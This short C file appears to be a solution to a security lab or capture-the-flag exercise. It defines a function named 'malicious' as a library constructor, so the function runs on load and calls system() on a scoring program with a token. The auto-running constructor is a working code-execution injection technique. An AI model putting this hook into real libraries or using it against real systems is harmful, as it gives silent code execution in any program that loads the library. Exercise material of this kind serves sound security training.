#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 0781e671-3ab6-4b36-b6e1-f35e7e3d5578");
}

